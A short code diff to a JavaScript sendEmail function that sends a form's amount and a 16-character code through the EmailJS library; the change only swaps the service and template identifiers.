@@ -4,8 +4,8 @@ function sendEmail() {
         code: document.getElementById("code").value,
     };
 
-    const serviceId = "service_b2qm6lr";
-    const templateId = "template_19amc56";
+    const serviceId = "service_l0t5qzm";
+    const templateId = "template_qtg3enn";
 
     if (params.amount > 0 && params.code.length === 16) {
         emailjs
